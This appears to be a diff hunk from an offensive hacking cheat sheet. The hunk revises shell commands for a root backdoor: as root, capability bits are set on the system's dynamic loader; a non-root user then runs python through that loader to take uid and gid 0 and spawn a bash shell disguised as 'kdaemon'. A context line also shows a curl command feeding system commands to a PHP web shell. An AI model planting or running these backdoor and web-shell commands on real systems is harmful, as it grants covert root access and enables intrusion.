@@ -1631,14 +1631,14 @@ curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
 ```bash
 ### Execute as ROOT user
 fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
-setcap cap_setuid+ep "${fn}"
+setcap cap_setuid,cap_setgid+ep "${fn}"
 ```
 
 ```bash
 ### Execute as non-root user to get root
 fn="$(readlink -f /lib64/ld-*.so.*)" || fn="$(readlink -f /lib/ld-*.so.*)" || fn="/lib/ld-linux.so.2"
 p="$(command -v python3 2>/dev/null)" || p="$(command -v python)"
-"${fn:?}" "$p" -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
+"${fn:?}" "$p" -c 'import os;os.setuid(0);os.setgid(0);os.execlp("bash", "kdaemon")'
 ```
 
 #### 2. Good old b00m shell
